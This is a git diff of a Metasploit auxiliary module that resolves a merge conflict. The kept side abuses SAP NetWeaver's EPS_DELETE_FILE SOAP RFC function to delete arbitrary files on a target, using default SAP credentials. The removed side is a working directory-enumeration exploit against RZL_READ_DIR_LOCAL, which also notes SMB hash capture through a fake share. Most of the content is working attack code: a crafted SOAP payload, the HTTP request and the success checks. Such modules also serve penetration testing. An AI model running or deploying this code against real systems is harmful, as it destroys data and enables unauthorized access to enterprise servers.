@@ -23,10 +23,6 @@
 ##
 
 require 'msf/core'
-<<<<<<< HEAD
-=======
-require 'rexml/document'
->>>>>>> ee28b1a90e3162d0936fada451d392642716f256
 
 class Metasploit4 < Msf::Auxiliary
 	include Msf::Exploit::Remote::HttpClient
@@ -35,7 +31,6 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-<<<<<<< HEAD
 			'Name' => 'SAP SOAP EPS_DELETE_FILE File Deletion',
 			'Description' => %q{
 					This module abuses the SAP NetWeaver EPS_DELETE_FILE function, on the SAP SOAP
@@ -65,52 +60,6 @@ class Metasploit4 < Msf::Auxiliary
 		], self.class)
 	end
 
-=======
-			'Name' => 'SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing',
-			'Description' => %q{
-					This module exploits the SAP NetWeaver RZL_READ_DIR_LOCAL function, on the SAP
-				SOAP RFC Service, to enumerate directory contents. It returns only the first 32
-				characters of the filename since they are truncated. The module can also be used to
-				capture SMB hashes by using a fake SMB share as DIR.
-			},
-			'References' => [
-				[ 'OSVDB', '92732'],
-				[ 'URL', 'http://erpscan.com/advisories/dsecrg-12-026-sap-netweaver-rzl_read_dir_local-missing-authorization-check-and-smb-relay-vulnerability/' ]
-			],
-			'Author' =>
-				[
-					'Alexey Tyurin', # Vulnerability discovery
-					'nmonkee' # Metasploit module
-				],
-			'License' => MSF_LICENSE
-		)
-
-		register_options([
-			OptString.new('CLIENT', [true, 'SAP Client', '001']),
-			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
-			OptString.new('PASSWORD', [true, 'Password', '06071992']),
-			OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
-		], self.class)
-	end
-
-	def parse_xml(xml_data)
-		files = []
-		xml_doc = REXML::Document.new(xml_data)
-		xml_doc.root.each_element('//item') do |item|
-			name = size = nil
-			item.each_element do |elem|
-				name = elem.text if elem.name == "NAME"
-				size = elem.text if elem.name == "SIZE"
-				break if name and size
-			end
-			if (name and size) and not (name.empty? or size.empty?)
-				files << { "name" => name, "size" => size }
-			end
-		end
-		return files
-	end
-
->>>>>>> ee28b1a90e3162d0936fada451d392642716f256
 	def run_host(ip)
 		data = '<?xml version="1.0" encoding="utf-8" ?>'
 		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
@@ -118,33 +67,17 @@ class Metasploit4 < Msf::Auxiliary
 		data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
 		data << '<SOAP-ENV:Header/>'
 		data << '<SOAP-ENV:Body>'
-<<<<<<< HEAD
 		data << '<EPS_DELETE_FILE xmlns="urn:sap-com:document:sap:rfc:functions">'
 		data << '<DIR_NAME>' + datastore['DIRNAME'] + '</DIR_NAME>'
 		data << '<FILE_NAME>' + datastore['FILENAME'] + '</FILE_NAME>'
 		data << '<IV_LONG_DIR_NAME></IV_LONG_DIR_NAME>'
 		data << '<IV_LONG_FILE_NAME></IV_LONG_FILE_NAME>'
 		data << '</EPS_DELETE_FILE>'
-=======
-		data << '<RZL_READ_DIR_LOCAL xmlns="urn:sap-com:document:sap:rfc:functions">'
-		data << '<FILE_TBL>'
-		data << '<item>'
-		data << '<NAME></NAME>'
-		data << '<SIZE></SIZE>'
-		data << '</item>'
-		data << '</FILE_TBL>'
-		data << '<NAME>' + datastore['DIR'] + '</NAME>'
-		data << '</RZL_READ_DIR_LOCAL>'
->>>>>>> ee28b1a90e3162d0936fada451d392642716f256
 		data << '</SOAP-ENV:Body>'
 		data << '</SOAP-ENV:Envelope>'
 
 		begin
-<<<<<<< HEAD
 			vprint_status("#{rhost}:#{rport} - Sending request to delete #{datastore['FILENAME']} at #{datastore['DIRNAME']}")
-=======
-			vprint_status("#{rhost}:#{rport} - Sending request to enumerate #{datastore['DIR']}")
->>>>>>> ee28b1a90e3162d0936fada451d392642716f256
 			res = send_request_cgi({
 				'uri' => '/sap/bc/soap/rfc',
 				'method' => 'POST',
@@ -160,7 +93,6 @@ class Metasploit4 < Msf::Auxiliary
 					'sap-language' => 'EN'
 				}
 			})
-<<<<<<< HEAD
 
 			if res and res.code == 200 and res.body =~ /EPS_DELETE_FILE.Response/ and res.body.include?(datastore['FILENAME']) and res.body.include?(datastore['DIRNAME'])
 				print_good("#{rhost}:#{rport} - File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted")
@@ -175,19 +107,3 @@ class Metasploit4 < Msf::Auxiliary
 			end
 		end
 	end
-=======
-			if res and res.code == 200 and res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/
-				files = parse_xml(res.body)
-				path = store_loot("sap.soap.rfc.dir", "text/xml", rhost, res.body, datastore['DIR'])
-				print_good("#{rhost}:#{rport} - #{datastore['DIR']} successfully enumerated, results stored on #{path}")
-				files.each { |f|
-					vprint_line("Entry: #{f["name"]}, Size: #{f["size"].to_i}")
-				}
-			end
-		rescue ::Rex::ConnectionError
-			vprint_error("#{rhost}:#{rport} - Unable to connect")
-			return
-		end
-	end
-end
->>>>>>> ee28b1a90e3162d0936fada451d392642716f256
